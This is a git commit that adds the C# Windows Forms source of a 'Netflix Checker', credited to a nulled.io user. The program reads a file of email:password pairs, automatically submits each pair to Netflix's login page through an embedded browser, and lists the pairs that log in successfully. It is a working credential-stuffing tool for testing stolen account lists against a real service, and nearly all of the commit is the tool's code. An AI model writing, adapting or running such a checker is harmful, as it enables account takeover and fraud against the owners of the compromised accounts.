050d4bc53af6ed71a3f3dd99085c94c71d07f688
Discordian <Felixmaster455>
2015-09-25 13:56:34 +1000

    Added Checker

---
+++ NetflixChecker/Form1.Designer.cs
@@ -0,0 +1,165 @@
+﻿namespace NetflixChecker
+{
+    partial class frmMain
+    {
+        /// <summary>
+        /// Required designer variable.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// Clean up any resources being used.
+        /// </summary>
+        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows Form Designer generated code
+
+        /// <summary>
+        /// Required method for Designer support - do not modify
+        /// the contents of this method with the code editor.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            this.webNetflix = new System.Windows.Forms.WebBrowser();
+            this.btnCheckAccount = new System.Windows.Forms.Button();
+            this.lblThing = new System.Windows.Forms.Label();
+            this.lblResult = new System.Windows.Forms.Label();
+            this.openFileDialog1 = new System.Windows.Forms.OpenFileDialog();
+            this.txtFileName = new System.Windows.Forms.TextBox();
+            this.btnOpen = new System.Windows.Forms.Button();
+            this.lblWorking = new System.Windows.Forms.Label();
+            this.txtWorkingAccounts = new System.Windows.Forms.TextBox();
+            this.label1 = new System.Windows.Forms.Label();
+            this.SuspendLayout();
+            // 
+            // webNetflix
+            // 
+            this.webNetflix.Location = new System.Drawing.Point(12, 140);
+            this.webNetflix.MinimumSize = new System.Drawing.Size(20, 20);
+            this.webNetflix.Name = "webNetflix";
+            this.webNetflix.Size = new System.Drawing.Size(920, 417);
+            this.webNetflix.TabIndex = 0;
+            this.webNetflix.DocumentCompleted += new System.Windows.Forms.WebBrowserDocumentCompletedEventHandler(this.webNetflix_DocumentCompleted);
+            // 
+            // btnCheckAccount
+            // 
+            this.btnCheckAccount.Location = new System.Drawing.Point(145, 85);
+            this.btnCheckAccount.Name = "btnCheckAccount";
+            this.btnCheckAccount.Size = new System.Drawing.Size(267, 39);
+            this.btnCheckAccount.TabIndex = 5;
+            this.btnCheckAccount.Text = "Check Accounts";
+            this.btnCheckAccount.UseVisualStyleBackColor = true;
+            this.btnCheckAccount.Click += new System.EventHandler(this.btnCheckAccount_Click);
+            // 
+            // lblThing
+            // 
+            this.lblThing.AutoSize = true;
+            this.lblThing.Font = new System.Drawing.Font("Microsoft Sans Serif", 14.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.lblThing.Location = new System.Drawing.Point(788, 36);
+            this.lblThing.Name = "lblThing";
+            this.lblThing.Size = new System.Drawing.Size(67, 24);
+            this.lblThing.TabIndex = 6;
+            this.lblThing.Text = "Result:";
+            // 
+            // lblResult
+            // 
+            this.lblResult.AutoSize = true;
+            this.lblResult.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.lblResult.Location = new System.Drawing.Point(870, 36);
+            this.lblResult.Name = "lblResult";
+            this.lblResult.Size = new System.Drawing.Size(0, 20);
+            this.lblResult.TabIndex = 7;
+            // 
+            // openFileDialog1
+            // 
+            this.openFileDialog1.FileName = "openFileDialog1";
+            // 
+            // txtFileName
+            // 
+            this.txtFileName.Location = new System.Drawing.Point(122, 26);
+            this.txtFileName.Name = "txtFileName";
+            this.txtFileName.Size = new System.Drawing.Size(413, 20);
+            this.txtFileName.TabIndex = 8;
+            // 
+            // btnOpen
+            // 
+            this.btnOpen.Location = new System.Drawing.Point(11, 23);
+            this.btnOpen.Name = "btnOpen";
+            this.btnOpen.Size = new System.Drawing.Size(105, 23);
+            this.btnOpen.TabIndex = 9;
+            this.btnOpen.Text = "Open Text File";
+            this.btnOpen.UseVisualStyleBackColor = true;
+            this.btnOpen.Click += new System.EventHandler(this.btnOpen_Click);
+            // 
+            // lblWorking
+            // 
+            this.lblWorking.AutoSize = true;
+            this.lblWorking.Font = new System.Drawing.Font("Microsoft Sans Serif", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.lblWorking.Location = new System.Drawing.Point(969, 108);
+            this.lblWorking.Name = "lblWorking";
+            this.lblWorking.Size = new System.Drawing.Size(140, 16);
+            this.lblWorking.TabIndex = 10;
+            this.lblWorking.Text = "Working Accounts: 0/0";
+            // 
+            // txtWorkingAccounts
+            // 
+            this.txtWorkingAccounts.Location = new System.Drawing.Point(963, 140);
+            this.txtWorkingAccounts.Multiline = true;
+            this.txtWorkingAccounts.Name = "txtWorkingAccounts";
+            this.txtWorkingAccounts.Size = new System.Drawing.Size(277, 417);
+            this.txtWorkingAccounts.TabIndex = 11;
+            // 
+            // label1
+            // 
+            this.label1.AutoSize = true;
+            this.label1.Location = new System.Drawing.Point(2, 578);
+            this.label1.Name = "label1";
+            this.label1.Size = new System.Drawing.Size(147, 13);
+            this.label1.TabIndex = 12;
+            this.label1.Text = "By Discordian (nulled.io) 2015";
+            // 
+            // frmMain
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.ClientSize = new System.Drawing.Size(1252, 603);
+            this.Controls.Add(this.label1);
+            this.Controls.Add(this.txtWorkingAccounts);
+            this.Controls.Add(this.lblWorking);
+            this.Controls.Add(this.btnOpen);
+            this.Controls.Add(this.txtFileName);
+            this.Controls.Add(this.lblResult);
+            this.Controls.Add(this.lblThing);
+            this.Controls.Add(this.btnCheckAccount);
+            this.Controls.Add(this.webNetflix);
+            this.Name = "frmMain";
+            this.Text = "Discordian\'s Awesome Netflix Checker";
+            this.Load += new System.EventHandler(this.frmMain_Load);
+            this.ResumeLayout(false);
+            this.PerformLayout();
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.WebBrowser webNetflix;
+        private System.Windows.Forms.Button btnCheckAccount;
+        private System.Windows.Forms.Label lblThing;
+        private System.Windows.Forms.Label lblResult;
+        private System.Windows.Forms.OpenFileDialog openFileDialog1;
+        private System.Windows.Forms.TextBox txtFileName;
+        private System.Windows.Forms.Button btnOpen;
+        private System.Windows.Forms.Label lblWorking;
+        private System.Windows.Forms.TextBox txtWorkingAccounts;
+        private System.Windows.Forms.Label label1;
+    }
+}
+
---
+++ NetflixChecker/Form1.cs
@@ -0,0 +1,185 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.IO;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+
+namespace NetflixChecker
+{
+    public partial class frmMain : Form
+    {
+
+        bool loginSuccessful = false;
+        bool firstRun = true;
+        string[] accounts;
+        int value = 0;
+        int Successful_Accounts = 0;
+        int totalAccounts = 0;
+        bool accountsChecked = false;
+
+        public frmMain()
+        {
+            InitializeComponent();
+            webNetflix.Navigate("https://www.netflix.com/Login?locale=en-AU");
+        }
+
+        public void RefreshPage()
+        {
+            webNetflix.Navigate("https://www.netflix.com/SignOut?Inkctr=mL");
+        }
+
+        private void webNetflix_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
+        {
+            if (e.Url.AbsolutePath != (sender as WebBrowser).Url.AbsolutePath)
+            {
+                return;
+            }
+
+            if (webNetflix.Url == new Uri("https://www.netflix.com/Login?locale=en-AU"))
+            {
+                if (loginSuccessful == true && firstRun == false)
+                {
+                    try
+                    {
+                        value++;
+                        string[] line = accounts[value].Split(':');
+                        startChecking(line[0], line[1]);
+                        loginSuccessful = false;
+                    }
+                    catch (Exception ex)
+                    {
+                        MessageBox.Show("All accounts tested");
+                        this.Controls.Add(btnCheckAccount);
+                        accountsChecked = true;
+                    
+                    }
+                }
+                else if (loginSuccessful == false && firstRun == true)
+                {
+                    lblResult.Text = "";
+                }
+                else if (loginSuccessful == false && firstRun == false)
+                {
+                    lblResult.Text = "Login Failed!";
+                    lblWorking.Text = "Working Accounts: " + Successful_Accounts.ToString() + "/" + totalAccounts.ToString();
+                    value++;
+                    string[] line = accounts[value].Split(':');
+                    startChecking(line[0], line[1]);
+                }
+            }
+            else if (webNetflix.Url == new Uri("http://www.netflix.com/browse"))
+            {
+                try
+                {
+                    string[] line = accounts[value].Split(':');
+                    txtWorkingAccounts.Text += "\n\n" + line[0] + "    " + line[1] + "\n";
+                    loginSuccessful = true;
+                    lblResult.Text = "Login Successful!";
+                    Successful_Accounts++;
+                    lblWorking.Text = "Working Accounts: " + Successful_Accounts.ToString() + "/" + totalAccounts.ToString();
+                    RefreshPage();
+                }
+                catch (Exception ex)
+                {
+                    RefreshPage();
+                }
+            }
+            else if (webNetflix.Url == new Uri("https://www.netflix.com/logout?locale=en-AU"))
+            {
+                lblResult.Text = "";
+                webNetflix.Navigate("https://www.netflix.com/Login?locale=en-AU");
+            }
+        }
+
+        public void HTMLwork(string emailValue, string passValue)
+        {
+            try
+            {
+                firstRun = false;
+                HtmlDocument doc = webNetflix.Document;
+                HtmlElement email = doc.GetElementById("email");
+                HtmlElement pass = doc.GetElementById("password");
+                HtmlElement submit = doc.GetElementById("login-form-contBtn");
+                email.SetAttribute("value", emailValue);
+                pass.SetAttribute("value", passValue);
+                submit.InvokeMember("click");
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show("Please wait for the page to reload back to the login screen");
+            }
+        }
+
+        public void startChecking(string emailValue, string passValue)
+        {
+            if (firstRun == true && accountsChecked == false)
+            {
+                HTMLwork(emailValue, passValue);
+            }
+            else if (firstRun == false && accountsChecked == false)
+            {
+                HTMLwork(emailValue, passValue);
+            }
+            else if (firstRun == false && accountsChecked == true)
+            {
+                MessageBox.Show("These accounts have already been checked.");
+            }
+        }
+
+        private void btnCheckAccount_Click(object sender, EventArgs e)
+        {
+            this.Controls.Remove(btnCheckAccount);
+            string[] line = accounts[0].Split(':');
+            startChecking(line[0], line[1]);
+        }
+
+        private void openFileWork()
+        {
+            OpenFileDialog ofd = new OpenFileDialog();
+
+            if (ofd.ShowDialog() == DialogResult.OK)
+            {
+                value = 0;
+                accountsChecked = false;
+                firstRun = true;
+                string FileName = ofd.FileName;
+
+                try
+                {
+                    using (StreamReader sr = new StreamReader(FileName))
+                    {
+                        string line = sr.ReadToEnd();
+                        txtFileName.Text = FileName;
+                        string[] lines = line.Split('\n');
+                        accounts = lines;
+                        totalAccounts = accounts.Count();
+                        lblWorking.Text = "Working Accounts: " + Successful_Accounts.ToString() + "/" + totalAccounts.ToString();
+                    }
+                }
+                catch (Exception ex)
+                {
+                    MessageBox.Show(ex.ToString() + " Failed to read file");
+                }
+            }
+            else
+            {
+                MessageBox.Show("File Open was cancelled!");
+            }
+        }
+        
+        private void btnOpen_Click(object sender, EventArgs e)
+        {
+            openFileWork();
+        }
+
+        private void frmMain_Load(object sender, EventArgs e)
+        {
+
+        }
+    }
+}
